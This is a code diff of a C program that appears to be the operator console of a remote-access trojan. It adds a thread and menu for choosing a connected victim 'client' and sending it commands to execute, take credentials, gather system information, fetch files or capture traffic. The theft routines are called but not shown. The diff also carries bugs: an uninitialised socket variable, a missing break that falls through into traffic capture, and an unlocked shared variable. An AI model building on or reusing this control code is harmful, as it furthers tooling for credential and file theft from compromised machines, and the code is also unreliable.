@@ -27,8 +27,13 @@ pthread_t threads[20];
 pthread_mutex_t connection_mutex=PTHREAD_MUTEX_INITIALIZER;
 int connected_clients=0;
 
+int current_window=0; //0 main menu 1 un client
+pthread_mutex_t window_mutex=PTHREAD_MUTEX_INITIALIZER;
+int active_client=-2;
+pthread_mutex_t active_client_mutex=PTHREAD_MUTEX_INITIALIZER;
+
 pthread_t display_thread;
-pthread_t input_thread;
+pthread_t interaction_thread;
 
 void add_client(int sockID,struct sockaddr_in client_addr)
 {
@@ -236,34 +241,139 @@ void capturetraffic(int clientfd)
 }
 
 void* input_routine(void* args)
-{
+{   
+    int connfd;
+    while(1)
+    {   
+        //write(STDOUT_FILENO,options,strlen(options));
+        char opt;
+        read(STDIN_FILENO,&opt,sizeof(opt));
+        flushSTDIN(); 
+        switch(opt)
+        {   
+            //TODO: flush la buffer ul de stdin atunci cand vreau sa trimit o comanda
+            case '1':
+            write(connfd,"1",1);
+            exec_on_client(connfd);
+            //flushSocketRead(connfd);
+            break;
+            case '2':
+            write(connfd,"2",1);
+            get_credentials(connfd);
+            //flushSocketRead(connfd);
+            break;
+            case '3':
+            write(connfd, "3", 1);
+            get_system_info(connfd);
+            //flushSocketRead(connfd);
+            break;
+            case '4':
+            write(connfd,"4",1);
+            retrieve_file(connfd);
+            //flushSocketRead(connfd);
+            case '5':
+            write(connfd,"5",1);
+            capturetraffic(connfd);
+            //IN LUCRU
+            //case '6':
+            //write(connfd, "6", 1);
+            //get_system_monitor(connfd);
+            //break;
+            default:
+            break;
 
+        }
+    }
+    
 }
+
+void* client_interaction_thread(void* args) {
+    while (1) {
+        pthread_mutex_lock(&active_client_mutex);
+        int client_id = active_client;
+        pthread_mutex_unlock(&active_client_mutex);
+
+        if (client_id < 0) {
+            sleep(1); // Niciun client selectat, așteaptă
+            continue;
+        }
+
+        pthread_mutex_lock(&client_mutex);
+        int client_sock = clients[client_id].sockID;
+        pthread_mutex_unlock(&client_mutex);
+
+        printf("Interacting with client #%d\n", client_id);
+        printf("Options:\n");
+        printf(" 1. Execute command\n 2. Get credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n");
+        printf("Enter option: ");
+
+        char option;
+        scanf(" %c", &option);
+
+        switch (option) {
+            case '1':
+                write(client_sock, "1", 1);
+                exec_on_client(client_sock);
+                break;
+            case '2':
+                write(client_sock, "2", 1);
+                get_credentials(client_sock);
+                break;
+            case '3':
+                write(client_sock, "3", 1);
+                get_system_info(client_sock);
+                break;
+            case '4':
+                write(client_sock, "4", 1);
+                retrieve_file(client_sock);
+                break;
+            case '5':
+                write(client_sock, "5", 1);
+                capturetraffic(client_sock);
+                break;
+            default:
+                printf("Invalid option!\n");
+                break;
+        }
+    }
+    return NULL;
+}
+
 
 void* mainmenu_display(void * args)
 {   
-    system("clear");
-    pthread_create(&input_thread,0,input_routine,0);
-    int known_nr_clients=0;
-    while(1)
-    {
-        if(known_nr_clients!=connected_clients)
-        {   
-            known_nr_clients=connected_clients;
-            system("clear");
-            for(int i=0;i<known_nr_clients;i++)
-            {   
-                pthread_mutex_lock(&client_mutex);
-                printf("Client #%d\n",clients[i].index);
-                printf("Client socket:%d\n",clients[i].sockID);
-                char ip_str[INET_ADDRSTRLEN];
-                inet_ntop(AF_INET,&(clients[i].address.sin_addr),ip_str,INET_ADDRSTRLEN);
-                printf("Client ip:%s\n\n",ip_str);
-                pthread_mutex_unlock(&client_mutex);
-            }
+    while (1) {
+
+        if(active_client==-2)
+        {
+        pthread_mutex_lock(&client_mutex);
+        system("clear");
+        printf("Connected clients:\n");
+
+        for (int i = 0; i < connected_clients; i++) {
+            printf("Client #%d | Socket: %d | IP: %s\n", 
+                clients[i].index, 
+                clients[i].sockID,
+                inet_ntoa(clients[i].address.sin_addr)
+            );
         }
+        pthread_mutex_unlock(&client_mutex);
+
+        printf("\nEnter the client number to interact with (or -1 to exit): ");
+        int selected_client;
+        scanf("%d", &selected_client);
+
+        pthread_mutex_lock(&active_client_mutex);
+        active_client = selected_client;
+        pthread_mutex_unlock(&active_client_mutex);
+
+        if (selected_client == -1) {
+            break; // Ieși din meniu
+        }
+        }
+        
     }
-    return;
+    return NULL;
 }
 
 int main()
@@ -275,6 +385,8 @@ int main()
         memset(&(clients[i].address),0,sizeof(struct sockaddr_in));
     }
     pthread_create(&display_thread,0,mainmenu_display,0);
+    pthread_create(&interaction_thread, NULL, client_interaction_thread, NULL);
+
 
     int sockfd;
     char buffer[MAXLINE];
@@ -334,12 +446,9 @@ int main()
             pthread_create(&threads[connected_clients-1],NULL,client_connect,new_client);
 
         }
-
-
-
     }
 
-    while(1)
+    /*while(1)
     {   
         write(STDOUT_FILENO,options,strlen(options));
         char opt;
@@ -381,6 +490,10 @@ int main()
         }
 
     }
+    */
+    
+    pthread_join(display_thread, NULL);
+    pthread_join(interaction_thread, NULL);
 
     close(connfd);
     
